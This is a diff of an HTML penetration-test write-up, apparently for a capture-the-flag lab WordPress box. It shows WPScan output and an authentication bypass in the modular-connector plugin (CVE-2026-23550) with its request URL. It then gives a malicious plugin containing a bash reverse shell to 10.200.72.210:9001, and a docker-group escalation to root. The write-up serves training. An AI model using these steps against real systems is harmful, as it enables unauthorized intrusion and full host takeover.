@@ -139,12 +139,6 @@ Interesting Finding(s):
 [+] XML-RPC seems to be enabled: http://10.1.61.224/xmlrpc.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
 
 [+] WordPress readme found: http://10.1.61.224/readme.html
  | Found By: Direct Access (Aggressive Detection)
@@ -153,35 +147,19 @@ Interesting Finding(s):
 [+] Debug Log found: http://10.1.61.224/wp-content/debug.log
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 100%
- | Reference: https://codex.wordpress.org/Debugging_in_WordPress
 
 [+] The external WP-Cron seems to be enabled: http://10.1.61.224/wp-cron.php
  | Found By: Direct Access (Aggressive Detection)
  | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
 
 [+] WordPress version 6.0 identified (Insecure, released on 2022-05-24).
  | Found By: Rss Generator (Passive Detection)
- |  - http://10.1.61.224/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;
- |  - http://10.1.61.224/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.0&lt;/generator&gt;
 
 [+] WordPress theme in use: twentytwentytwo
  | Location: http://10.1.61.224/wp-content/themes/twentytwentytwo/
  | Last Updated: 2025-12-03T00:00:00.000Z
  | Readme: http://10.1.61.224/wp-content/themes/twentytwentytwo/readme.txt
  | [!] The version is out of date, the latest version is 2.1
- | Style URL: http://10.1.61.224/wp-content/themes/twentytwentytwo/style.css?ver=1.2
- | Style Name: Twenty Twenty-Two
- | Style URI: https://wordpress.org/themes/twentytwentytwo/
- | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
- | Author: the WordPress team
- | Author URI: https://wordpress.org/
- |
- | Found By: Css Style In Homepage (Passive Detection)
- | Confirmed By: Css Style In 404 Page (Passive Detection)
- |
  | Version: 1.2 (80% confidence)
  | Found By: Style (Passive Detection)
  |  - http://10.1.61.224/wp-content/themes/twentytwentytwo/style.css?ver=1.2, Match: 'Version: 1.2'
@@ -214,27 +192,17 @@ Interesting Finding(s):
  | Version: 2.5.0 (80% confidence)
  | Found By: Readme - Stable Tag (Aggressive Detection)
  |  - http://10.1.61.224/wp-content/plugins/modular-connector/readme.txt
-
-[!] No WPScan API Token given, as a result vulnerability data has not been output.
-[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-
-[+] Finished: Wed Jul 29 19:57:30 2026
-[+] Requests Done: 1539
-[+] Cached Requests: 11
-[+] Data Sent: 415.934 KB
-[+] Data Received: 690.053 KB
-[+] Memory used: 302.086 MB
-[+] Elapsed time: 00:00:35</span></pre>
+</span></pre>
       </div>
 
-      <p class="row out dim">
+      <p class="note">
         modular-connector 2.5.0 is vulnerable to an authentication bypass <code>(CVE-2026-23550)</code>. We can use the exploit found at
         <code>https://cvereports.com/reports/CVE-2026-23550</code> to bypass authentication with a special request —
         <code>http://{target}/api/modular-connector/login/{{random}}?origin=mo&amp;type=1</code>
       </p>
 
       <p class="row"><span class="step-num">[03]</span> Uploading a malicious .zip</p>
-      <p class="row out dim">
+      <p class="note">
         Usually with WordPress sites, the go-to is to edit the source code of any page (I typically use the main or 404 page) to add malicious PHP code.
         However, we have to upload a malicious plugin instead, since our code is being sanitized. To do this, we create our own plugin:
       </p>
@@ -248,13 +216,13 @@ Interesting Finding(s):
 exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.200.72.210/9001 0&gt;&amp;1'")
 ?&gt;</span></pre>
       </div>
-      <p class="row out dim">
+      <p class="note">
         Save that as <code>shell.php</code>, zip it with <code>zip shell.zip shell.php</code>, then upload it via
         <code>Plugins → Add New → Upload Plugin → select shell.zip → Install Now → start listener → Activate plugin</code>.
       </p>
 
       <p class="row"><span class="step-num">[04]</span> Shell as "www-data"</p>
-      <p class="row out dim">
+      <p class="note">
         Checking our user permissions with <code>id</code>, we can see we are in the docker group —
         <code>uid=33(www-data) gid=33(www-data) groups=33(www-data),121(docker)</code>. Using deepce, we find a privilege escalation path.
       </p>
@@ -339,7 +307,7 @@ CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
       </div>
 
       <p class="row"><span class="step-num">[05]</span> Privilege escalation</p>
-      <p class="row out dim">
+      <p class="note">
         From the output we can see that we are able to escalate our privileges by mounting the host system. First we need to upgrade to a proper TTY using
         <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>. Then, following the link, we simply need to run
         <code>docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash</code> — and we're root.
